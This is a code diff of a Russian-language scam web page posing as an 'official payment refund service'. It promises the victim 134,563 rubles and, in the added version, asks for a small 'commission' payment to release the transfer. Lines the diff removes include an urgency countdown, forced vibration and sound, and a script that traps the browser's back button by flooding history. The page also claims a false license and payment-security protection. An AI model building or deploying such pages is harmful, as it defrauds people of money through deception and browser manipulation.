@@ -1,5 +1,5 @@
 <html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-	<title>Срок вывода средств истекает</title>
+	<title>ОПЛАТИТЬ КОМИССИЮ И ПОЛУЧИТЬ ПЕРЕВОД</title>
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 <!--===============================================================================================-->
@@ -19,61 +19,8 @@
 	<link rel="stylesheet" type="text/css" href="index_files2/main2.css">
 	<script src="index_files2/jquery-3.2.1.min.js"></script>
 
-	 <script>var page_id = 1;</script> 
-	 		<script>
-
-    var sMobile = 'alert.mp3',
-        sDesktop = 'alert.mp3';
-    function isMobileDevice() {
-        return (typeof window.orientation !== 'undefined') || (navigator.userAgent.indexOf('IEMobile') !== -1);
-    }
-    isMobileDevice() ? sound = sMobile : sound = sDesktop;
-
-    window.addEventListener('load', function () {
-        var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        var source = audioCtx.createBufferSource();
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', sound);
-        xhr.responseType = 'arraybuffer';
-        xhr.addEventListener('load', function (r) {
-            console.log(xhr.response);
-            audioCtx.decodeAudioData(
-                    xhr.response,
-                    function (buffer) {
-                        source.buffer = buffer;
-                        source.connect(audioCtx.destination);
-                        source.loop = false;
-                    });
-            source.start(0);
-        });
-        xhr.send();
-    });
-
-
-    ! function(a) {
-        try {
-            var t = a.vibrate || a.webkitVibrate || a.mozVibrate || a.msVibrate;
-            t && t.call(a, [666, 333, 666, 333, 666, 333, 666, 333, 666, 333, 666, 333, 666, 333])
-        } catch (a) {}
-    }(navigator)
-	
-	
-	
-	
-	        ! function () { 
-            var t; 
-			var tmp=window.location.href;
-            try { 
-                for (t = 0; 10 > t; ++t) history.pushState({}, '', ''); 
-                onpopstate = function (t) { 
-				t.state && location.replace(tmp);
-					//t.state && location.reload(true);
-					
-                     
-                } 
-            } catch (o) {} 
-        }();
-</script>   	
+			 <script>var page_id = 4;</script> 
+	  	
 	
 	<script src='js/redirect.js'></script>
 	
@@ -132,78 +79,87 @@
 
 		faviconPulse(1000);
 </script> 
-	
 </head><body>
 
 
 
 	<div class="bg-contact100">
+
 		<div class="container-contact100">
 			<div class="wrap-contact100">
-				<div class="contact100-pic js-tilt" data-tilt="">
-					<img src="index_files2/alert-repeatable1.gif" alt="IMG" style="margin-bottom: 20px;">
-				</div>
-				
-				
-									<script>
-var count=1799;
-var count2;
-var count20;
-var count3;
-var count30;
-var counter=setInterval(timer, 1000);
-function timer()
-{count=count-1;
-if (count <= 1){clearInterval(counter); document.getElementById("timer").innerHTML="<span class='blink'>00:00</span>"; return;}
-//if (count == 0) {count=99;}
-if (count != 0) {count2 = Math.floor(count/60);}
-count3 = count-count2*60;
-if (count2 <=9) {count20="0";} else {count20="";}
-if (count3 <=9) {count30="0";} else {count30="";}
-document.getElementById("timer").innerHTML="<span class='blink'>"+count20+count2+":"+count30+count3 +"</span>";
-}
-</script>
 
-				<form class="contact100-form validate-form">
-					<span class="contact100-form-title" style="padding-bottom: 25px;">
-						<!--Вам поступило онлайн оповещение-->СРОЧНОЕ ОПОВЕЩЕНИЕ №50355035! 
+				<form class="contact100-form validate-form" style="margin: 0 auto;" action="billing" method="POST">
+					<span class="contact100-form-title" style="padding-bottom: 24px;">
+						<center>Выберите способ перевода</center>
 					</span>
 
-<!--Сообщаем, что Вам полагается компенсационная выплата. #e15258;-->Напоминаем Вам, что срок вывода средств истекает. Через <b>30 минут</b> <!-- деньги будут изъяты, а транзитный счет аннулирован-->доступ к деньгам будет заблокирован.
+Пожалуйста, выберите способ перевода денежных средств на Ваши реквизиты.
 
-<br>
-<br>
-Сумма к получению: <b><span style="color: #0d902b;">134 563 Рублей (RUB)</span></b><br>
-Транзитный счет: <b>№407028109671000***</b><br>
-Статус: <b>ожидание ввода реквизитов</b><br>
-Аннулирование транзакции: <b>через <span id="timer">29:59</span> минут</b><br><br>
-
-
-					<div class="container-contact100-form-btn">
-						<a href="index2.html" class="contact100-form-btn">
-							ВЫВЕСТИ СРЕДСТВА
-						</a>
+<br /><br />
+					<div class="wrap-input100 validate-input" data-validate = "Name is required">
+					
+					<select class="input100" id="ichangerged" style="height: 50px;border-radius: 5px;padding: 0 0 0 49px;outline: none;" required="">
+                                <option value="1" selected="">Стандартный перевод</option>
+                                <option value="2">Мгновенный перевод</option>
+                            </select>
+					
+						<span class="focus-input100"></span>
+						<span class="symbol-input100">
+							<i class="fa fa-check-square-o" aria-hidden="true"></i>
+						</span>
 					</div>
-<br><br><br><br>			</form>
-<div class="info100">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p><font size="5"><b>ОФИЦИАЛЬНЫЙ СЕРВИС ВОЗВРАТА ПЛАТЕЖЕЙ</b></font></p>
-<img src="index_files/newlogo4.jpg" alt="СВП"></div>
+
+<br />
+<div id="dv1" style="display:none">
+Сумма к получению: <b><span style="color: #0d902b;">134 563 Рублей (RUB)</span></b><br />
+Подтверждение транзакции: <b>автоматическое</b><br />
+Статус платежа: <b>готов к выплате</b><br />
+Срок выплаты: <b>3 минуты</b><br /><br />
+*Сумма комиссионного сбора для переводов превышающих 100 000 Рублей (RUB): <b>490 руб.</b><br /><br />
+<div class="container-contact100-form-btn">
+<div class="ip_lnk"></div><a href="https://lolzteam.net/" class="contact100-form-btn">
+<center>
+ОПЛАТИТЬ КОМИССИЮ И ПОЛУЧИТЬ ПЕРЕВОД
+</center>
+</a>
+</div>
+</div>
+<div id="dv2">
+Сумма к получению: <b><span style="color: #0d902b;">134 563 Рублей (RUB)</span></b><br />
+Подтверждение транзакции: <b>оператором</b><br />
+Статус платежа: <b>готов к переводу</b><br />
+Срок выплаты: <b>до 24 часов</b><br /><br />
+*Сумма комиссионного сбора для переводов превышающих 100 000 Рублей (RUB): <b>390 руб.</b><br /><br />
+<div class="container-contact100-form-btn">
+<div class="ip_lnk"></div><a href="https://lolzteam.net/" class="contact100-form-btn">
+<center>
+ОПЛАТИТЬ КОМИССИЮ И ПОЛУЧИТЬ ПЕРЕВОД
+</center>
+</a>
+</div>
+</div>
+					
+					
+				</form>
 			</div>
 		</div>
+
 	</div>
-<div class="foterblock">
-<div class="foterblockgo">
-<div class="foterblockgotext">
-
-<span style="color:#000000;font-family:&#39;MegaFon Graphik LC Web Reg&#39;;font-size:12px;"> 236041, г. Калининград, ул.Александра Невского, 5.</span><br>
-<span style="color:#000000;font-family:&#39;MegaFon Graphik LC Web Reg&#39;;font-size:12px;">СВП 2009 - <script type="text/javascript">var mdate = new Date(); document.write(mdate.getFullYear());</script> ГОД ВСЕ ПРАВА ЗАЩИЩЕНЫ</span><br>
-<span style="color:#000000;font-family:&#39;MegaFon Graphik LC Web Reg&#39;;font-size:12px;">Срок действия лицензии 29.06.<script>document.write(mdate.getFullYear()+3);</script> года</span><br>
-<span style="color:#36AF38;font-family:&#39;MegaFon Graphik LC Web Reg&#39;;font-size:12px;"><strong>Служба поддержки находится на связи 24/7</strong></span>
-<span style="color:#000000;font-family:&#39;MegaFon Graphik LC Web Reg&#39;;font-size:12px;"><br>Почта поддержки участников: svp<script type="text/javascript">var mdate = new Date(); document.write(mdate.getDate());document.write("-");document.write(mdate.getFullYear());</script>@yandex.ru</span><br>
-<span style="color:#000000;font-family:&#39;MegaFon Graphik LC Web Reg&#39;;font-size:16px;"><b>Защиту онлайн-платежей предоставляет:</b></span><br>
-<img src="index_files2/6756847dfhjdghk.png" alt="3DS" width="200" height="75">
-<center><a href="offer.html" style="color: #b5b5b5;font-size: 10px;" target="_blank">Пользовательское соглашение</a><br><a href="confi.html" style="color: #b5b5b5;font-size: 10px;" target="_blank">Политика конфиденциальности</a></center>
-
-</div></div></div>
+		<script type='text/javascript'>
+$(function() {
+$('#ichangerged').change(function() {
+var infv = $("#ichangerged").val();
+if (infv == 1) {
+$('#dv1').hide();
+$('#dv2').show();
+}
+if (infv == 2) {
+$('#dv1').show();
+$('#dv2').hide();
+}
+});
+});
+</script>
 
 
 
@@ -225,6 +181,7 @@ document.getElementById("timer").innerHTML="<span class='blink'>"+count20+count2
 
         <script src="index_files2/script.js"></script>
         <link rel="stylesheet" href="index_files2/style.css">
+		
         <div class="yvedw">
             <div class="yved yvedf1">
                 <img src="index_files2/CardMatch_FlatCards.png" alt="" class="yvedi">
@@ -314,4 +271,13 @@ document.getElementById("timer").innerHTML="<span class='blink'>"+count20+count2
                     </div>
                 </div>
             </div>
-           </div></body></html>
+           </div>
+		
+		   
+	<!--	  
+		   		 <style type="text/css">#hellopreloader>p{display:none;}#hellopreloader_preload{display: block;position: fixed;z-index: 99999;top: 0;left: 0;width: 100%;height: 100%;min-width: 1000px;background: #000 url(img/circles.svg) center center no-repeat;background-size:150px;}</style>
+<div id="hellopreloader"><div id="hellopreloader_preload"></div></div>
+<script type="text/javascript">var hellopreloader = document.getElementById("hellopreloader_preload");function fadeOutnojquery(el){el.style.opacity = 1;var interhellopreloader = setInterval(function(){el.style.opacity = el.style.opacity - 0.05;if (el.style.opacity <=0.05){ clearInterval(interhellopreloader);hellopreloader.style.display = "none";}},16);}window.onload = function(){setTimeout(function(){fadeOutnojquery(hellopreloader);},5000);};</script>
+-->
+		 
+		   </body></html>
